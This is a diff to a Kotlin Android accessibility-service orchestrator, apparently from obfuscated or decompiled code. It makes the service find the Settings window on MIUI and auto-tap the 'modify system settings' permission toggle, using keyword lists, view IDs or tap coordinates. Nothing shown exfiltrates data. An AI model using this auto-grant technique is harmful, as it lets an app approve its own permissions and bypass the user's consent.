@@ -19,6 +19,7 @@ import com.storm.safe.rock.service.modules.yw5xud.GestureTapHelper
 import com.storm.safe.rock.service.modules.yw5xud.UiDebugger
 import com.storm.safe.rock.p000.DangerKeywords
 import com.storm.safe.rock.service.MyAccessibilityService
+import com.storm.safe.rock.service.modules.automation.A11yWindowResolver
 import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
 import java.util.ArrayDeque
 import java.util.Locale
@@ -2450,10 +2451,20 @@ class MainOrchestrator(
      */
     private suspend fun attemptAutoClickSafe(root: AccessibilityNodeInfo): Boolean {
         return try {
-            val toggleNode = findAllowModifyToggle(root)
+            // MIUI withholds a11y focus from Settings windows → rootInActiveWindow may be desktop.
+            // Re-resolve to Settings window when available.
+            val rootPkg = root.packageName?.toString() ?: ""
+            val targetRoot = if (rootPkg !in A11yWindowResolver.SETTINGS_PACKAGES) {
+                A11yWindowResolver.findSettingsRoot(service) ?: root
+            } else {
+                root
+            }
+            Log.d(TAG, "🔍 [autoClick] root pkg=$rootPkg, using targetRoot pkg=${targetRoot.packageName}")
+
+            val toggleNode = findAllowModifyToggle(targetRoot)
             Log.d(TAG, "🔍 [autoClick] findAllowModifyToggle=${toggleNode != null}")
             if (toggleNode == null) {
-                val fallback = findAllowModifyNode(root)
+                val fallback = findAllowModifyNode(targetRoot)
                 Log.d(TAG, "🔍 [autoClick] findAllowModifyNode=${fallback != null}")
                 if (fallback != null) {
                     UiDebugger.dumpPage(service, "ws_no_toggle_found", "findAllowModifyToggle=null, findAllowModifyNode=true")
@@ -2461,7 +2472,7 @@ class MainOrchestrator(
                     return true
                 }
                 // Strategy A': find Switch via byViewId (bypasses incomplete a11y tree) or DFS
-                val anySwitch = findSwitchByKnownIds(root) ?: findFirstSwitchNodeOnPage(root)
+                val anySwitch = findSwitchByKnownIds(targetRoot) ?: findFirstSwitchNodeOnPage(targetRoot)
                 if (anySwitch != null) {
                     val rect = android.graphics.Rect()
                     anySwitch.getBoundsInScreen(rect)
@@ -2483,7 +2494,7 @@ class MainOrchestrator(
                 // MIUI's WRITE_SETTINGS page has a clickable PreferenceItem row, not an exposed Switch node
                 // (existing keyword-based logic)
                 for (keyword in DangerKeywords.modifySystemSettingsKeywords) {
-                    val nodes = root.findAccessibilityNodeInfosByText(keyword) ?: continue
+                    val nodes = targetRoot.findAccessibilityNodeInfosByText(keyword) ?: continue
                     for (textNode in nodes) {
                         if (!textNode.isVisibleToUser) continue
                         val nodeId = textNode.viewIdResourceName ?: ""
